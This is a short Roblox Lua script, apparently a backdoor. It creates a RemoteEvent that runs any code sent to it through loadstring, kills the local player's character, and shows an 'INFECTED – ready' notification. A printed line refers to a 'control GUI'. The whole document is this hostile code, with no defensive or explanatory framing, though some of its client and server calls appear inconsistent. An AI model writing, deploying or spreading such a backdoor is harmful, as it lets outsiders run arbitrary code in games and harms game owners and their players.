local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if _G.BENES_2025 then return end
_G.BENES_2025 = true

local relay = Instance.new("RemoteEvent")
relay.Name = "BENES_2025"
relay.Parent = ReplicatedStorage

relay.OnClientEvent:Connect(function(msg)
    local success, data = pcall(HttpService.JSONDecode, HttpService, msg)
    if success and data.code then
        loadstring(data.code)()
    end
end)

spawn(function()
    wait(1)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = 0
    end
end)

game.StarterGui:SetCore("SendNotification",{Title="benesmybf",Text="INFECTED – ready",Duration=6})
print("BENES_2025 RemoteEvent created – control GUI will work")
